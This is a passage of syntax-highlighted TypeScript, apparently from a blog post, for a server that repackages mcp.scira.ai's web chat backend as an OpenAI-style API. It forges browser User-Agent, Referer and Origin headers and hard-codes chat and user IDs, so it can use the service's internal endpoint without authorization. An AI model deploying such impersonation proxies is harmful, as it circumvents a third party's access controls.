class="string">&quot;gpt-4.1-mini&quot;</span>,</span><br><span class="line">    <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;claude-3-7-sonnet&quot;</span>,</span><br><span class="line">    <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化消息为Scira格式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">formatMessagesForScira</span>(<span class="params"><span class="attr">messages</span>: <span class="title class_">Message</span>[]</span>): <span class="title class_">Message</span>[] &#123;</span><br><span class="line">  <span class="keyword">return</span> messages.<span class="title function_">map</span>(<span class="function"><span class="params">msg</span> =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">role</span>: msg.<span class="property">role</span>,</span><br><span class="line">    <span class="attr">content</span>: msg.<span class="property">content</span>,</span><br><span class="line">    <span class="attr">parts</span>: [&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">      <span class="attr">text</span>: msg.<span class="property">content</span></span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建Scira请求负载</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buildSciraPayload</span>(<span class="params"><span class="attr">messages</span>: <span class="title class_">Message</span>[], model = DEFAULT_MODEL</span>): <span class="title class_">SciraPayload</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> formattedMessages = <span class="title function_">formatMessagesForScira</span>(messages);</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="variable constant_">FIXED_CHAT_ID</span>,</span><br><span class="line">    <span class="attr">messages</span>: formattedMessages,</span><br><span class="line">    <span class="attr">selectedModel</span>: model,</span><br><span class="line">    <span class="attr">mcpServers</span>: [],</span><br><span class="line">    <span class="attr">chatId</span>: <span class="variable constant_">FIXED_CHAT_ID</span>,</span><br><span class="line">    <span class="attr">userId</span>: <span class="variable constant_">FIXED_USER_ID</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理模型列表请求</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleModelsRequest</span>(<span class="params"></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> response = &#123;</span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;list&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: <span class="variable constant_">AVAILABLE_MODELS</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(response), &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理聊天补全请求</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleChatCompletionsRequest</span>(<span class="params"><span class="attr">req</span>: <span class="title class_">Request</span></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> requestData = <span class="keyword">await</span> req.<span class="title function_">json</span>();</span><br><span class="line">  <span class="keyword">const</span> &#123; messages, model = <span class="variable constant_">DEFAULT_MODEL</span>, stream = <span class="literal">false</span> &#125; = requestData;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> sciraPayload = <span class="title function_">buildSciraPayload</span>(messages, model);</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="variable constant_">API_URL</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">      <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Referer&quot;</span>: <span class="string">`https://mcp.scira.ai/chat/<span class="subst">$&#123;FIXED_CHAT_ID&#125;</span>`</span>,</span><br><span class="line">      <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://mcp.scira.ai&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(sciraPayload),</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stream) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">handleStreamResponse</span>(response, model);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">handleRegularResponse</span>(response, model);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理流式响应</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleStreamResponse</span>(<span class="params"><span class="attr">response</span>: <span class="title class_">Response</span>, <span class="attr">model</span>: <span class="built_in">string</span></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> reader = response.<span class="property">body</span>!.<span class="title function_">getReader</span>();</span><br><span class="line">  <span class="keyword">const</span> encoder = <span class="keyword">new</span> <span class="title class_">TextEncoder</span>();</span><br><span class="line">  <span class="keyword">const</span> decoder = <span class="keyword">new</span> <span class="title class_">TextDecoder</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> id = <span class="string">`chatcmpl-<span class="subst">$&#123;<span class="built_in">Date</span>.now().toString(<span class="number">36</span>)&#125;</span><span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">36</span>).substring(<span class="number">2</span>, <span class="number">10</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">const</span> createdTime = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">const</span> systemFingerprint = <span class="string">`fp_<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">36</span>).substring(<span class="number">2</span>, <span class="number">12</span>)&#125;</span>`</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> stream = <span class="keyword">new</span> <span class="title class_">ReadableStream</span>(&#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">start</span>(<span class="params">controller</span>) &#123;</span><br><span class="line">      <span class="comment">// 发送流式头部</span></span><br><span class="line">      <span class="keyword">const</span> headerEvent = &#123;</span><br><span class="line">        <span class="attr">id</span>: id,</span><br><span class="line">        <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">        <span class="attr">created</span>: createdTime,</span><br><span class="line">        <span class="attr">model</span>: model,</span><br><span class="line">        <span class="attr">system_fingerprint</span>: systemFingerprint,</span><br><span class="line">        <span class="attr">choices</span>: [&#123;</span><br><span class="line">          <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">          <span class="attr">delta</span>: &#123; <span class="attr">role</span>: <span class="string">&quot;assistant&quot;</span> &#125;,</span><br><span class="line">          <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">          <span class="attr">finish_reason</span>: <span class="literal">null</span></span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;;</span><br><span class="line">      controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(headerEvent)&#125;</span>\n\n`</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> buffer = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; done, value &#125; = <span class="keyword">await</span> reader.<span class="title function_">read</span>();</span><br><span class="line">          <span class="keyword">if</span> (done) <span class="keyword">break</span>;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 解码当前数据块并添加到缓冲区</span></span><br><span class="line">          buffer += decoder.<span class="title function_">decode</span>(value, &#123; <span class="attr">stream</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 处理完整的行</span></span><br><span class="line">          <span class="keyword">const</span> lines = buffer.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">          <span class="comment">// 保留最后一个可能不完整的行</span></span><br><span class="line">          buffer = lines.<span class="title function_">pop</span>() || <span class="string">&quot;&quot;</span>;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 处理并立即发送每一行</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">const</span> line <span class="keyword">of</span> lines) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!line.<span class="title function_">trim</span>()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;g:&#x27;</span>)) &#123;</span><br><span class="line">              <span class="comment">// 对于g开头的行，输出reasoning_content</span></span><br><span class="line">              <span class="keyword">let</span> content = line.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">replace</span>(<span class="regexp">/^&quot;/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&quot;$/</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">              content = content.<span class="title function_">replace</span>(<span class="regexp">/\\n/g</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">              </span><br><span class="line">              <span class="keyword">const</span> event = &#123;</span><br><span class="line">                <span class="attr">id</span>: id,</span><br><span class="line">                <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">                <span class="attr">created</span>: createdTime,</span><br><span class="line">                <span class="attr">model</span>: model,</span><br><span class="line">                <span class="attr">system_fingerprint</span>: systemFingerprint,</span><br><span class="line">                <span class="attr">choices</span>: [&#123;</span><br><span class="line">                  <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                  <span class="attr">delta</span>: &#123; <span class="attr">reasoning_content</span>: content &#125;,</span><br><span class="line">                  <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">                  <span class="attr">finish_reason</span>: <span class="literal">null</span></span><br><span class="line">                &#125;]</span><br><span class="line">              &#125;;</span><br><span class="line">              controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(event)&#125;</span>\n\n`</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;0:&#x27;</span>)) &#123;</span><br><span class="line">              <span class="comment">// 对于0开头的行，输出content</span></span><br><span class="line">              <span class="keyword">let</span> content = line.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">replace</span>(<span class="regexp">/^&quot;/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&quot;$/</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">              content = content.<span class="title function_">replace</span>(<span class="regexp">/\\n/g</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">              </span><br><span class="line">              <span class="keyword">const</span> event = &#123;</span><br><span class="line">                <span class="attr">id</span>: id,</span><br><span class="line">                <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">                <span class="attr">created</span>: createdTime,</span><br><span class="line">                <span class="attr">model</span>: model,</span><br><span class="line">                <span class="attr">system_fingerprint</span>: systemFingerprint,</span><br><span class="line">                <span class="attr">choices</span>: [&#123;</span><br><span class="line">                  <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                  <span class="attr">delta</span>: &#123; <span class="attr">content</span>: content &#125;,</span><br><span class="line">                  <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">                  <span class="attr">finish_reason</span>: <span class="literal">null</span></span><br><span class="line">                &#125;]</span><br><span class="line">              &#125;;</span><br><span class="line">              controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(event)&#125;</span>\n\n`</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;e:&#x27;</span>)) &#123;</span><br><span class="line">              <span class="comment">// 完成消息</span></span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> finishData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(line.<span class="title function_">slice</span>(<span class="number">2</span>));</span><br><span class="line">                <span class="keyword">const</span> event = &#123;</span><br><span class="line">                  <span class="attr">id</span>: id,</span><br><span class="line">                  <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">                  <span class="attr">created</span>: createdTime,</span><br><span class="line">                  <span class="attr">model</span>: model,</span><br><span class="line">                  <span class="attr">system_fingerprint</span>: systemFingerprint,</span><br><span class="line">                  <span class="attr">choices</span>: [&#123;</span><br><span class="line">                    <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="attr">delta</span>: &#123;&#125;,</span><br><span class="line">                    <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">finish_reason</span>: finishData.<span class="property">finishReason</span> || <span class="string">&quot;stop&quot;</span></span><br><span class="line">                  &#125;]</span><br><span class="line">                &#125;;</span><br><span class="line">                controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(event)&#125;</span>\n\n`</span>));</span><br><span class="line">              &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error parsing finish data:&quot;</span>, error);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理缓冲区中剩余的内容（如果有的话）</span></span><br><span class="line">        <span class="keyword">if</span> (buffer.<span class="title function_">trim</span>()) &#123;</span><br><span class="line">          <span class="keyword">const</span> line = buffer.<span class="title function_">trim</span>();</span><br><span class="line">          <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;g:&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">let</span> content = line.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">replace</span>(<span class="regexp">/^&quot;/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&quot;$/</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            content = content.<span class="title function_">replace</span>(<span class="regexp">/\\n/g</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> event = &#123;</span><br><span class="line">              <span class="attr">id</span>: id,</span><br><span class="line">              <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">              <span class="attr">created</span>: createdTime,</span><br><span class="line">              <span class="attr">model</span>: model,</span><br><span class="line">              <span class="attr">system_fingerprint</span>: systemFingerprint,</span><br><span class="line">              <span class="attr">choices</span>: [&#123;</span><br><span class="line">                <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">delta</span>: &#123; <span class="attr">reasoning_content</span>: content &#125;,</span><br><span class="line">                <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">finish_reason</span>: <span class="literal">null</span></span><br><span class="line">              &#125;]</span><br><span class="line">            &#125;;</span><br><span class="line">            controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(event)&#125;</span>\n\n`</span>));</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;0:&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">let</span> content = line.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">replace</span>(<span class="regexp">/^&quot;/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&quot;$/</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            content = content.<span class="title function_">replace</span>(<span class="regexp">/\\n/g</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> event = &#123;</span><br><span class="line">              <span class="attr">id</span>: id,</span><br><span class="line">              <span class="attr">object</span>: <span class="string">&quot;chat.completion.chunk&quot;</span>,</span><br><span class="line">              <span class="attr">created</span>: createdTime,</span><br><span class="line">              <span class="attr">model</span>: model,</span><br><span class="line">              <span class="attr">system_fingerprint</span>: systemFingerprint,</span><br><span class="line">              <span class="attr">choices</span>: [&#123;</span><br><span class="line">                <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">delta</span>: &#123; <span class="attr">content</span>: content &#125;,</span><br><span class="line">                <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">finish_reason</span>: <span class="literal">null</span></span><br><span class="line">              &#125;]</span><br><span class="line">            &#125;;</span><br><span class="line">            controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">`data: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(event)&#125;</span>\n\n`</span>));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Stream error:&quot;</span>, error);</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 确保发送 &quot;data: [DONE]&quot;</span></span><br><span class="line">        controller.<span class="title function_">enqueue</span>(encoder.<span class="title function_">encode</span>(<span class="string">&quot;data: [DONE]\n\n&quot;</span>));</span><br><span class="line">        controller.<span class="title function_">close</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(stream, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/event-stream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理非流式响应</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handleRegularResponse</span>(<span class="params"><span class="attr">response</span>: <span class="title class_">Response</span>, <span class="attr">model</span>: <span class="built_in">string</span></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line">  <span class="keyword">const</span> lines = text.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">let</span> content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> reasoning_content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> usage = &#123; <span class="attr">prompt_tokens</span>: <span class="number">0</span>, <span class="attr">completion_tokens</span>: <span class="number">0</span>, <span class="attr">total_tokens</span>: <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="keyword">let</span> finish_reason = <span class="string">&quot;stop&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> line <span class="keyword">of</span> lines) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!line.<span class="title function_">trim</span>()) <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;0:&#x27;</span>)) &#123;</span><br><span class="line">      <span class="comment">// 常规内容 - 处理转义的换行符</span></span><br><span class="line">      <span class="keyword">let</span> lineContent = line.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">replace</span>(<span class="regexp">/^&quot;/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&quot;$/</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      lineContent = lineContent.<span class="title function_">replace</span>(<span class="regexp">/\\n/g</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      content += lineContent;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;g:&#x27;</span>)) &#123;</span><br><span class="line">      <span class="comment">// 推理内容 - 处理转义的换行符</span></span><br><span class="line">      <span class="keyword">let</span> lineContent = line.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">replace</span>(<span class="regexp">/^&quot;/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/&quot;$/</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      lineContent = lineContent.<span class="title function_">replace</span>(<span class="regexp">/\\n/g</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      reasoning_content += lineContent;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;e:&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> finishData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(line.<span class="title function_">slice</span>(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">if</span> (finishData.<span class="property">finishReason</span>) &#123;</span><br><span class="line">          finish_reason = finishData.<span class="property">finishReason</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error parsing finish data:&quot;</span>, error);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (line.<span class="title function_">startsWith</span>(<span class="string">&#x27;d:&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> finishData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(line.<span class="title function_">slice</span>(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">if</span> (finishData.<span class="property">usage</span>) &#123;</span><br><span class="line">          usage.<span class="property">prompt_tokens</span> = finishData.<span class="property">usage</span>.<span class="property">promptTokens</span> || <span class="number">0</span>;</span><br><span class="line">          usage.<span class="property">completion_tokens</span> = finishData.<span class="property">usage</span>.<span class="property">completionTokens</span> || <span class="number">0</span>;</span><br><span class="line">          usage.<span class="property">total_tokens</span> = usage.<span class="property">prompt_tokens</span> + usage.<span class="property">completion_tokens</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error parsing usage data:&quot;</span>, error);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> systemFingerprint = <span class="string">`fp_<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">36</span>).substring(<span class="number">2</span>, <span class="number">12</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">const</span> id = <span class="string">`chatcmpl-<span class="subst">$&#123;<span class="built_in">Date</span>.now().toString(<span class="number">36</span>)&#125;</span><span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">36</span>).substring(<span class="number">2</span>, <span class="number">10</span>)&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> openAIResponse = &#123;</span><br><span class="line">    <span class="attr">id</span>: id,</span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;chat.completion&quot;</span>,</span><br><span class="line">    <span class="attr">created</span>: <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>),</span><br><span class="line">    <span class="attr">model</span>: model,</span><br><span class="line">    <span class="attr">system_fingerprint</span>: systemFingerprint,</span><br><span class="line">    <span class="attr">choices</span>: [&#123;</span><br><span class="line">      <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">message</span>: &#123;</span><br><span class="line">        <span class="attr">role</span>: <span class="string">&quot;assistant&quot;</span>,</span><br><span class="line">        <span class="attr">content</span>: content</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">logprobs</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">finish_reason</span>: finish_reason</span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="attr">usage</span>: usage</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 如果存在推理内容，添加到消息中</span></span><br><span class="line">  <span class="keyword">if</span> (reasoning_content.<span class="title function_">trim</span>()) &#123;</span><br><span class="line">    openAIResponse.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">message</span>.<span class="property">reasoning_content</span> = reasoning_content;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(openAIResponse), &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123; </span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主请求处理函数</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handler</span>(<span class="params"><span class="attr">req</span>: <span class="title class_">Request</span></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置CORS头</span></span><br><span class="line">  <span class="keyword">const</span> headers = &#123;</span><br><span class="line">    <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Access-Control-Allow-Methods&quot;</span>: <span class="string">&quot;GET, POST, OPTIONS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Access-Control-Allow-Headers&quot;</span>: <span class="string">&quot;Content-Type, Authorization&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 处理OPTIONS请求（CORS预检）</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;OPTIONS&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="literal">null</span>, &#123; </span><br><span class="line">      headers,</span><br><span class="line">      <span class="attr">status</span>: <span class="number">204</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 处理模型列表接口</span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">pathname</span> === <span 